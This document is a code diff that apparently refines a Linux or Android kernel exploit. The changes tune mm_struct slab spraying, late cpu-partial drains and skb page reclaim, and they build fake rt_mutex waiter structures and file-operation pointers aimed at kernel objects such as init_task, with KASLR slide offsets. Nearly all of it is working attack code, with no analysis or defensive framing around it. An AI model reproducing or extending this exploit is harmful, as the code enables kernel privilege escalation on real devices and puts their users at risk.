@@ -11,6 +11,22 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
+static void log_mm_slabinfo(const char *stage) {
+  FILE *fp = fopen("/proc/slabinfo", "r");
+  if (!fp) {
+    return;
+  }
+
+  char line[256];
+  while (fgets(line, sizeof(line), fp)) {
+    if (strncmp(line, "mm_struct ", 10) == 0) {
+      pr_info("mm slabinfo %s %s", stage, line);
+      break;
+    }
+  }
+  fclose(fp);
+}
+
 uintptr_t page_base;
 uintptr_t fake_lock;
 uintptr_t fake_w0;
@@ -20,6 +36,7 @@ uintptr_t fake_right;
 uintptr_t fake_left;
 uintptr_t fake_fops;
 uintptr_t binwrite_target;
+uintptr_t slide_p0_offset;
 char ashmem_path[256] = "/dev/ashmem";
 
 void setup_kernelsnitch(void) {
@@ -252,7 +269,7 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
-  return p0_data_alias(image_addr);
+  return p0_data_alias(image_addr) + slide_p0_offset;
 }
 
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
@@ -462,19 +479,40 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     binwrite_target = payload_base + FOPS_OFF + 0x700;
   }
 
+#ifdef SLIDE_RECLAIM_SCAN_PHASE
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
+      unsigned char *p = skb_buf + chunk;
+      for (size_t off = SLIDE_RECLAIM_SCAN_PHASE;
+           off + 0x20 <= ORDER3_SIZE; off += 0x20) {
+        put64(p, off + 0x08, 0x4141000000000000ULL | off);
+      }
+    }
+    return 1;
+  }
+#endif
+
   uintptr_t write_pc = fake_fops;
   uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
   uintptr_t write_left = 0;
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
+  uint32_t waiter_prio = FAKE_WAITER_PRIO;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1;
+    write_pc = SLIDE_LOGGERS_0_1 + slide_p0_offset;
     write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
-    waiter_task = SLIDE_INIT_TASK;
-    task_group = SLIDE_ROOT_TASK_GROUP;
-    pi_top_task = SLIDE_INIT_TASK;
+    write_left = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
+#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
+    waiter_task = fake_task;
+    task_group = 0;
+    pi_top_task = fake_task;
+#else
+    waiter_task = SLIDE_INIT_TASK + slide_p0_offset;
+    task_group = SLIDE_ROOT_TASK_GROUP + slide_p0_offset;
+    pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
+#endif
+    waiter_prio = SLIDE_FAKE_WAITER_PRIO;
   }
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
@@ -482,9 +520,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      put64(p, LOCK_OFF + 0x08, 0);
-      put64(p, LOCK_OFF + 0x10, 0);
-      put64(p, LOCK_OFF + 0x18, 0);
+      put64(p, LOCK_OFF + 0x08, fake_w0);
+      put64(p, LOCK_OFF + 0x10, fake_w0);
+      put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
@@ -494,12 +532,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, W0_OFF + 0x00, 1);
     put64(p, W0_OFF + 0x08, 0);
     put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, waiter_prio);
     put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
     put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
     put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
     put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, waiter_prio);
     put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
     put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
     put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
@@ -548,6 +586,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
+  }
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
   }
 
@@ -612,6 +652,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
+          leaked, base, (leaked - base) / MM_STRUCT_SZ);
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -649,17 +691,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    SYSCHK(close(pre_ctx.memfds[i]));
-    pre_ctx.memfds[i] = -1;
-  }
-  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
-    SYSCHK(close(post_ctx.memfds[i]));
-    post_ctx.memfds[i] = -1;
-  }
   for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
+  }
+  size_t target_pre = pre_ctx.mm_cnt - 1;
+  SYSCHK(close(pre_ctx.memfds[target_pre]));
+  pre_ctx.memfds[target_pre] = -1;
+  SYSCHK(close(post_ctx.memfds[0]));
+  post_ctx.memfds[0] = -1;
+  pr_info("mm target-neighbor slab queued for late drain\n");
+  for (size_t i = 0; i < target_pre; i++) {
+    SYSCHK(close(pre_ctx.memfds[i]));
+    pre_ctx.memfds[i] = -1;
+  }
+  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
+    SYSCHK(close(post_ctx.memfds[i]));
+    post_ctx.memfds[i] = -1;
   }
 
   SYSCHK(close(pcp_shaping_sv[0]));
@@ -668,8 +716,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+  log_mm_slabinfo("before-leak-close");
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
+  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
+  for (size_t i = 0; i < drain_triggers; i++) {
+    size_t index = i * mm_objs_per_slab;
+    SYSCHK(close(prepare_ctx.memfds[index]));
+    prepare_ctx.memfds[index] = -1;
+    kill_child(prepare_ctx.childs[index]);
+    prepare_ctx.childs[index] = -1;
+  }
+  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
+  log_mm_slabinfo("after-late-drain");
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -681,9 +740,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   ks = NULL;
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    SYSCHK(close(prepare_ctx.memfds[i]));
-    prepare_ctx.memfds[i] = -1;
-    kill_child(prepare_ctx.childs[i]);
+    if (prepare_ctx.memfds[i] >= 0) {
+      SYSCHK(close(prepare_ctx.memfds[i]));
+      prepare_ctx.memfds[i] = -1;
+    }
+    if (prepare_ctx.childs[i] > 0) {
+      kill_child(prepare_ctx.childs[i]);
+      prepare_ctx.childs[i] = -1;
+    }
   }
 
   return base;
